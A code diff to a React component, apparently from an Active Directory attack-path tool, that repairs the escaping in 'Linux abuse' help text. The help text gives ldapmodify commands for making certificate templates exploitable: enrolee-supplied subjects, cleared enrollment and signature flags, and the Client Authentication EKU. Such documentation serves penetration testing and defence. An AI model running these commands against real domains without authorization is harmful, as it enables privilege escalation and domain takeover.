@@ -131,7 +131,7 @@ const LinuxAbuse: FC = () => {
                 Set the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag as the only enabled flag using ldapmodify:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Certificate-Name-Flag\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Name-Flag\\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
@@ -170,7 +170,7 @@ const LinuxAbuse: FC = () => {
                 Remove all flags from <code>msPKI-Enrollment-Flag</code> using ldapmodify:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Enrollment-Flag\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
@@ -206,15 +206,10 @@ const LinuxAbuse: FC = () => {
             <CodeController>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" pKIExtendedKeyUsage`}</CodeController>
             <Typography variant='body2'>Set the Client Authentication EKU using ldapmodify:</Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: msPKI-Certificate-Application-Policy\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: pKIExtendedKeyUsage
-                pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: pKIExtendedKeyUsage\\npKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first two command again to confirm the attributes have been set.
@@ -224,11 +219,7 @@ const LinuxAbuse: FC = () => {
                 but with the original values instead. To set multiple EKUs, use this format:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: ATTRIBUTE
-                ATTRIBUTE: EKU1
-                ATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: ATTRIBUTE\\nATTRIBUTE: EKU1\\nATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
         </>
     );
@@ -261,10 +252,7 @@ const LinuxAbuse: FC = () => {
                 Remove all flags from <code>msPKI-RA-Signature</code> using ldapmodify:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: msPKI-RA-Signature
-                msPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-RA-Signature\\nmsPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
